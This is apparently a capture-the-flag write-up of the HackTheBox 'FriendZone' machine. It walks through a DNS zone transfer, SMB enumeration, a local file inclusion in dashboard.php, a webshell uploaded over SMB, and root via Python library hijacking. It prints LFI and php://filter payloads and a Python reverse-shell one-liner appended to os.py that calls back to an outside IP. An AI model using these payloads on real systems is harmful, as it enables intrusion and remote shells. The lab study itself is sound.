## Reconnaissance

### nmap 

![](./IMG/0.png)

### Gathering information on port 53 

- Port 53 is DNS 
- ISC BIND 9.11.3-1ubuntu1.2

### FTP 

- Port 21
- Versions: vsftpd 3.0.3

### SMB

- Port 139 / 445
- Versions: netbios-ssn Samba smbd 3.X-4.X (Port 139)
- Versions: netbios-ssn Samba smbd 4.7.6-Ubuntu (Port 445)

- enum4linux-ng result

![](./IMG/1.png)
![](./IMG/2.png)

![](./IMG/3.png)

![](./IMG/4.png)
![](./IMG/5.png)

![](./IMG/6.png)

### Information for web service 

- Port 80

![](./IMG/7.png)
- Port 443

![](./IMG/8.png)
- Web Source 
- Disclose an interesting path

![](./IMG/9.png)
- Directory Forcing(light)

![](./IMG/10.png)
- Check ```/js/js```
- Strange encoded string 
- Base64 can decode but still can't know what does it mean

![](./IMG/11.png)
- Check ```/admin```
- Nothing in here

![](./IMG/12.png)
- zone transfer 
```
host -t axfr friendzone.red 10.129.228.175
```
or 
```
dig @10.129.228.176 friendzone.red axfr
```

![](./IMG/13.png)
#### Check subdomain
1. Administrator1
- A login page

![](./IMG/14.png)
- Directory Forcing(light)

![](./IMG/15.png)
- Access ```/images``` ---> Success
- I can access it without credential

![](./IMG/16.png)
- Using the credential from smb server to login

![](./IMG/17.png)
- Check /dashboard.php

![](./IMG/18.png)
- Check /timestamp.php

![](./IMG/19.png)
2. hr

![](./IMG/20.png)
3. uploads
- Upload function 

![](./IMG/21.png)
- After upload a image file(ex. gif)
- Response successfully and a code
- The page will redirect to (```upload.php```)

![](./IMG/22.png)
- Directory bruteForcing (light)
- Only find ```files```, I think it's necessary to do again with other heavy wordlists 

![](./IMG/23.png)
- First, check ```files``` 
- It's empty

![](./IMG/24.png)
- With files path,check the image I just upload
- ```/files/1679424213```
- 404 Not Found

![](./IMG/25.png)
- Confirm the vulnerability on administrator1 site
- It might have a LFI vulnerability
- The original one is like that 
```
/dashboard.php?image_id=b.jpg&pagename=timestamp
```
![](./IMG/26.png)
- The timestamp page content will display on the right corner
- Try to do the LFI to read other file (ex. upload.php)
- Access ``` /dashboard.php?image_id=a.jpb&pagename=timestamp/../../uploads/upload```

![](./IMG/27.png)
- The content of upload.php also show on the right corner

## Exploit


- Using php wrapper to check the file content.
```php://filter/convert.base64-encode/resource=dashboard```

![](./IMG/28.png)
- But I can't use this method toread the file which I don't know the name or the file doesn't exist in the current directory

### WebShell through SMB

- Upload reverse shell to smb server 
```
smbclient -U '%' -N //10.129.228.177/Development
```

![](./IMG/29.png)
- Execute it from web 
```
/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell
```

![](./IMG/30.png)
- Listener get shell 

![](./IMG/31.png)
- Get user flag: ``` 16fff0bb6064b6343c903844aace99b3 ```

![](./IMG/32.png)

## Post Exploitation

- Check web directroy, find mysql config

![](./IMG/33.png)
- It contains db credential 
```
db_user = friend
db_pass = Agpyu12!0.213$
```

![](./IMG/34.png)
- Use this credential to SSH login 

![](./IMG/35.png)
- Get User ```friend ``` permission

![](./IMG/36.png)
- Using linpeas to check privilege escalation point 
- I find there is an interesting python file named ``` reporter.py```
- Here is the content, this code seems in progress

![](./IMG/37.png)
- Check ```pspy64s ``` , it will be execute regularly

![](./IMG/38.png)
### Python library hijacking

- After research, there is a privilege escalation trick called **Python Library Hijackin**
- Revealed that Python has a list of search paths for its libraries; meaning there is an opportunity for privilege escalation depending on mis-configurations of the system and how it’s users are using it.

![](./IMG/39.png)
- [Python Library Hijacking on Linux (with examples)](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
- [Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)
### Privilege Escalation

- So let's find the order of priority for python 
```
python -c 'import sys; print "\n".join(sys.path)'
```

![](./IMG/40.png)
- Then the next part, I need to add the reverse code to existing ```os.py``` 
- Noted, I have tried to create new ```os.py``` to replace the old one, but it will failed
- So append the following code to existing ``` os.py```
```
import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.145",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```
- Then wait for the nc listener to get reverse shell 

![](./IMG/41.png)
- root flag: ```2502788fea3a947aecd6adb4248e40aa```

![](./IMG/42.png)


## Question

- How to port forward internal to external 

## Reference 

- [(Discussion)friendzone](https://forum.hackthebox.com/t/friendzone-hackthebox/1316/112)
- [(Writeup)firendzone 1](https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/)
- [(Writeup)firendzone 2](https://infosecwriteups.com/hackthebox-friendzone-9c52df249dcd)
- [(Writeup - YouTube)firendzone 3](https://www.youtube.com/watch?v=Zf8p49IzEEA)

### LFI

- [(GITHUB)LFI payload](https://github.com/payloadbox/rfi-lfi-payload-list)
- [(HackTrick)LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

### DNS

- [(HackTrick)DNS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)
- [DNS - dig](https://docstore.mik.ua/orelly/networking_2ndEd/dns/ch12_09.htm)
- [(HackTrick)SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [(HackTrick)FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
- [(GITHUB)enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
- [Linux smbclient command](https://www.computerhope.com/unix/smbclien.htm)
- [smbclient](https://wangchujiang.com/linux-command/c/smbclient.html)

### Python Library Hijacking

- [Python Library Hijacking on Linux (with examples)](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
- [Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)
- [Linux Privilege Escalation: Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

### Others

- [GTFObins](https://gtfobins.github.io/#exim4%20)
- [Reverse Shell Generator](https://www.revshells.com/)
- [SearchSploit Update](https://www.oreilly.com/library/view/kali-linux-cookbook/9781784390303/4e9c5a55-789a-4ca0-be86-f08b84f00e5e.xhtml)

![](./IMG/43.png)

### Possible Privilege Escalation CVE

- [(Exploit DB)Exim 4.87 - 4.91 - Local Privilege Escalation](https://www.exploit-db.com/exploits/46996)
- [(GITHUB)CVE-2019-10149 -1](https://github.com/Diefunction/CVE-2019-10149)
- [(GITHUB)CVE-2019-10149 -2](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim/blob/master/PoC_CVE-2019-10149.py)

#### SSH Port Forwarding

- [How to Use SSH Port Forwarding](https://phoenixnap.com/kb/ssh-port-forwarding)
- [Port Forwarding – Linux Privilege Escalation](https://juggernaut-sec.com/port-forwarding-lpe/)

###### tags: `HackTheBox` `linux` `Easy` `LFI` `SMB` `SMBClient` `Python` `Python Library Hijacking` `SSH PortForwarding` `Exim4`